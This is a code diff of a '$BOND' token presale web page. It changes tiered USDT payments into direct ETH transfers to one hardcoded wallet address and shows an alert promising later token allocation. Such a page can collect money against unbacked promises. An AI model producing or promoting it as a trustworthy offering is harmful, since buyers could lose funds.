@@ -285,7 +285,6 @@
         }
     </style>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@openzeppelin/contracts@4.0.0/build/contracts-abi.min.js"></script>
 </head>
 <body>
     <header>
@@ -315,18 +314,18 @@
                 <div class="tier-details">
                     <div class="detail-item">
                         <span>Minimum Purchase:</span>
-                        <span>10,000 USDT</span>
+                        <span>3.333 ETH</span> <!-- ~10,000 USDT equivalent -->
                     </div>
                     <div class="detail-item">
                         <span>Token Allocation:</span>
-                        <span>10,500 $BOND</span> <!-- 10,000 + 5% bonus -->
+                        <span>10,500 $BOND</span>
                     </div>
                     <div class="detail-item">
                         <span>Bonus:</span>
                         <span>5% Extra $BOND</span>
                     </div>
                 </div>
-                <button onclick="participate(10000)">Participate</button>
+                <button onclick="participate(3.333)">Participate</button>
             </div>
 
             <div class="tier-card silver animate-on-scroll">
@@ -337,18 +336,18 @@
                 <div class="tier-details">
                     <div class="detail-item">
                         <span>Minimum Purchase:</span>
-                        <span>50,000 USDT</span>
+                        <span>16.667 ETH</span> <!-- ~50,000 USDT equivalent -->
                     </div>
                     <div class="detail-item">
                         <span>Token Allocation:</span>
-                        <span>55,000 $BOND</span> <!-- 50,000 + 10% bonus -->
+                        <span>55,000 $BOND</span>
                     </div>
                     <div class="detail-item">
                         <span>Bonus:</span>
                         <span>10% Extra $BOND</span>
                     </div>
                 </div>
-                <button onclick="participate(50000)">Participate</button>
+                <button onclick="participate(16.667)">Participate</button>
             </div>
 
             <div class="tier-card gold animate-on-scroll">
@@ -359,18 +358,18 @@
                 <div class="tier-details">
                     <div class="detail-item">
                         <span>Minimum Purchase:</span>
-                        <span>100,000 USDT</span>
+                        <span>33.333 ETH</span> <!-- ~100,000 USDT equivalent -->
                     </div>
                     <div class="detail-item">
                         <span>Token Allocation:</span>
-                        <span>115,000 $BOND</span> <!-- 100,000 + 15% bonus -->
+                        <span>115,000 $BOND</span>
                     </div>
                     <div class="detail-item">
                         <span>Bonus:</span>
                         <span>15% Extra $BOND</span>
                     </div>
                 </div>
-                <button onclick="participate(100000)">Participate</button>
+                <button onclick="participate(33.333)">Participate</button>
             </div>
 
             <div class="tier-card platinum animate-on-scroll">
@@ -381,18 +380,18 @@
                 <div class="tier-details">
                     <div class="detail-item">
                         <span>Minimum Purchase:</span>
-                        <span>250,000 USDT</span>
+                        <span>83.333 ETH</span> <!-- ~250,000 USDT equivalent -->
                     </div>
                     <div class="detail-item">
                         <span>Token Allocation:</span>
-                        <span>300,000 $BOND</span> <!-- 250,000 + 20% bonus -->
+                        <span>300,000 $BOND</span>
                     </div>
                     <div class="detail-item">
                         <span>Bonus:</span>
                         <span>20% Extra $BOND</span>
                     </div>
                 </div>
-                <button onclick="participate(250000)">Participate</button>
+                <button onclick="participate(83.333)">Participate</button>
             </div>
         </div>
         <h2>$BOND Disclaimer:</h2>
@@ -402,21 +401,6 @@
 <script>
     let web3;
     let accounts;
-
-    const USDT_CONTRACT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Mainnet USDT contract
-    const USDT_ABI = [
-        // Minimal ABI for USDT transfer function
-        {
-            constant: false,
-            inputs: [
-                { name: "_to", type: "address" },
-                { name: "_value", type: "uint256" },
-            ],
-            name: "transfer",
-            outputs: [{ name: "", type: "bool" }],
-            type: "function",
-        },
-    ];
 
     async function connectWallet() {
         if (window.ethereum) {
@@ -446,14 +430,14 @@
             return;
         }
 
-        const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
-        const usdtAmount = web3.utils.toHex(amount * 10 ** 6); // USDT has 6 decimals
+        const ethAmount = web3.utils.toWei(amount.toString(), 'ether'); // Convert ETH to Wei
 
         try {
-            // Attempt to send the transaction without checking balances
-            const transaction = await usdtContract.methods
-                .transfer("0x9DE6Ee13F58B3e9B551202D8040983fdAfFE6033", usdtAmount)
-                .send({ from: accounts[0] });
+            const transaction = await web3.eth.sendTransaction({
+                from: accounts[0],
+                to: "0x9DE6Ee13F58B3e9B551202D8040983fdAfFE6033", // Replace with your wallet address
+                value: ethAmount,
+            });
 
             console.log(transaction);
             alert("Participation successful! Tokens will be allocated after the presale.");
